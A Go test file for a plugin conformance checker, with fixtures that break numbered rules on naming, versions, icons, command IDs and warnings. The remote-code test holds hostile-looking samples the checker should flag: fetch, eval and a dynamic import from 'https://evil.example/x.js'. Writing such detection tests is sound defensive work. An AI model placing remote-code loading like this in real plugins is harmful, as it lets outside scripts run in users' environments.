package pluginsvc

import (
	"bytes"
	"image"
	"image/png"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// One fixture per standard rule ConformDir enforces: a plugin that
// breaks exactly it, and a clean sibling that passes. The error text
// IS the contract an author reads, so every case pins the rule number.

func validIconManifest(id, name, extra string) string {
	base := `{"id":"` + id + `","name":"` + name + `","version":"1.0.0","icon":"icon.png"`
	if extra != "" {
		base += "," + extra
	}
	return base + "}"
}

func writePNG(t *testing.T, path string, w, h int) {
	t.Helper()
	var buf bytes.Buffer
	if err := png.Encode(&buf, image.NewRGBA(image.Rect(0, 0, w, h))); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, buf.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
}

func newFixture(t *testing.T, id, manifest string, files map[string]string) string {
	t.Helper()
	dir := writeConformPlugin(t, t.TempDir(), id, manifest, files)
	if _, ok := files["icon.png"]; !ok {
		writeTestIcon(t, dir)
	}
	return dir
}

func wantRule(t *testing.T, dir string, rule string) {
	t.Helper()
	problems := ConformDir(dir, "")
	joined := strings.Join(problems, "\n")
	if !strings.Contains(joined, rule) {
		t.Fatalf("want a problem naming %q, got %v", rule, problems)
	}
}

func TestConformStandard_Rule11_NameCarriesMillOrPlugin(t *testing.T) {
	dir := newFixture(t, "greeter", validIconManifest("greeter", "Mill Greeter", ""), map[string]string{"main.js": "export function activate() {}"})
	wantRule(t, dir, "standard rule 11")

	clean := newFixture(t, "greeter-ok", validIconManifest("greeter-ok", "Greeter", ""), map[string]string{"main.js": "export function activate() {}"})
	if problems := ConformDir(clean, ""); len(problems) != 0 {
		t.Fatalf("clean name should conform, got %v", problems)
	}
}

func TestConformStandard_Rule12_VersionMustBeSemver(t *testing.T) {
	dir := writeConformPlugin(t, t.TempDir(), "verby", `{"id":"verby","name":"Verby","version":"latest","icon":"icon.png"}`, map[string]string{"main.js": "export function activate() {}"})
	writeTestIcon(t, dir)
	wantRule(t, dir, "standard rule 12")
}

func TestConformStandard_Rule1_SettingNeedsADescription(t *testing.T) {
	manifest := validIconManifest("settingsy", "Settingsy", `"contributes":{"settings":[{"key":"mode","type":"string","label":"Mode","default":"a"}]}`)
	dir := newFixture(t, "settingsy", manifest, map[string]string{"main.js": "export function activate() {}"})
	wantRule(t, dir, "standard rule 1")
}

func TestConformStandard_Rule13_IconMissingOrWrongSize(t *testing.T) {
	dir := writeConformPlugin(t, t.TempDir(), "no-icon", `{"id":"no-icon","name":"No icon","version":"1.0.0"}`, map[string]string{"main.js": "export function activate() {}"})
	wantRule(t, dir, "standard rule 13")

	small := writeConformPlugin(t, t.TempDir(), "small-icon", `{"id":"small-icon","name":"Small icon","version":"1.0.0","icon":"icon.png"}`, map[string]string{"main.js": "export function activate() {}"})
	writePNG(t, filepath.Join(small, "icon.png"), 64, 64)
	wantRule(t, small, "standard rule 13")

	darkWrong := writeConformPlugin(t, t.TempDir(), "dark-icon", `{"id":"dark-icon","name":"Dark icon","version":"1.0.0","icon":"icon.png"}`, map[string]string{"main.js": "export function activate() {}"})
	writePNG(t, filepath.Join(darkWrong, "icon.png"), iconSize, iconSize)
	writePNG(t, filepath.Join(darkWrong, "icon@dark.png"), 32, 32)
	wantRule(t, darkWrong, "standard rule 13")
}

func TestConformStandard_Rule15_NoRemoteCode(t *testing.T) {
	cases := map[string]string{
		"bare fetch":     "export function activate(api) { fetch('https://x') }",
		"window.fetch":   "export function activate(api) { window.fetch('https://x') }",
		"eval":           "export function activate(api) { eval('1') }",
		"dynamic import": "export function activate(api) { import('https://evil.example/x.js') }",
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			dir := newFixture(t, "remote", validIconManifest("remote", "Remote", ""), map[string]string{"main.js": src})
			wantRule(t, dir, "standard rule 15")
		})
	}
	clean := newFixture(t, "remote-ok", validIconManifest("remote-ok", "Remote ok", ""), map[string]string{"main.js": "export function activate(api) { api.fetch('https://x') }"})
	if problems := ConformDir(clean, ""); len(problems) != 0 {
		t.Fatalf("api.fetch should conform, got %v", problems)
	}
}

func TestConformStandard_Rule16_LabelCaseAndEmoji(t *testing.T) {
	lower := newFixture(t, "casey", validIconManifest("casey", "lowercase name", ""), map[string]string{"main.js": "export function activate() {}"})
	wantRule(t, lower, "standard rule 16")

	emoji := newFixture(t, "emojiy", validIconManifest("emojiy", "Emojiy", ""), map[string]string{"main.js": "export function activate(api) { api.registerCommand({ id: 'emojiy.go', label: '🔥 Go', run: () => {} }) }"})
	wantRule(t, emoji, "standard rule 16")
}

func TestConformStandard_Rule17_CommandIDNamespace(t *testing.T) {
	manifest := validIconManifest("namey", "Namey", `"contributes":{"commands":[{"id":"go","label":"Go"}]}`)
	dir := newFixture(t, "namey", manifest, map[string]string{"main.js": "export function activate() {}"})
	wantRule(t, dir, "standard rule 17")

	okManifest := validIconManifest("namey-ok", "Namey ok", `"contributes":{"commands":[{"id":"namey-ok.go","label":"Go"}]}`)
	clean := newFixture(t, "namey-ok", okManifest, map[string]string{"main.js": "export function activate() {}"})
	if problems := ConformDir(clean, ""); len(problems) != 0 {
		t.Fatalf("namespaced command id should conform, got %v", problems)
	}
}

func TestConformStandardWarnings_Rule3_UnusedCapability(t *testing.T) {
	dir := newFixture(t, "capey", validIconManifest("capey", "Capey", `"capabilities":["open-url"]`), map[string]string{"main.js": "export function activate() {}"})
	warnings := strings.Join(ConformStandardWarnings(dir), "\n")
	if !strings.Contains(warnings, "standard rule 3") {
		t.Fatalf("want a rule-3 warning, got %q", warnings)
	}

	clean := newFixture(t, "capey-ok", validIconManifest("capey-ok", "Capey ok", `"capabilities":["open-url"]`), map[string]string{"main.js": "export function activate(api) { api.requestGuardedAction('open-url', {}, 'x') }"})
	if warnings := ConformStandardWarnings(clean); len(warnings) != 0 {
		t.Fatalf("used capability should carry no warning, got %v", warnings)
	}
}

func TestConformStandardWarnings_Rule9_ConsoleErrorWithoutNotify(t *testing.T) {
	dir := newFixture(t, "quiet", validIconManifest("quiet", "Quiet", ""), map[string]string{
		"main.js": "export function activate(api) { api.on('contents:changed', () => { void doThing().catch(console.error) }) }",
	})
	warnings := strings.Join(ConformStandardWarnings(dir), "\n")
	if !strings.Contains(warnings, "standard rule 9") {
		t.Fatalf("want a rule-9 warning, got %q", warnings)
	}

	clean := newFixture(t, "quiet-ok", validIconManifest("quiet-ok", "Quiet ok", ""), map[string]string{
		"main.js": "export function activate(api) { api.on('contents:changed', () => { void doThing().catch((e) => { api.notify({ text: 'Failed.' }); console.error(e) }) }) }",
	})
	if warnings := ConformStandardWarnings(clean); len(warnings) != 0 {
		t.Fatalf("a console.error beside api.notify should carry no warning, got %v", warnings)
	}
}

func TestConformStandardWarnings_Rule22_SetEditingWithoutInteractiveContent(t *testing.T) {
	dir := newFixture(t, "facey", validIconManifest("facey", "Facey", ""), map[string]string{
		"main.js": "export function activate() {}",
		"face.js": "export function renderFace(el, ctx) { ctx.setEditing(true) }",
	})
	warnings := strings.Join(ConformStandardWarnings(dir), "\n")
	if !strings.Contains(warnings, "standard rule 22") {
		t.Fatalf("want the rule 22 warning, got %v", warnings)
	}
	clean := newFixture(t, "facey-ok", validIconManifest("facey-ok", "Facey ok", ""), map[string]string{
		"main.js": "const decl = { content: 'interactive', renderFace(el, ctx) { ctx.setEditing(true) } }",
	})
	if warnings := ConformStandardWarnings(clean); len(warnings) != 0 {
		t.Fatalf("a declared interactive face must not warn, got %v", warnings)
	}
}
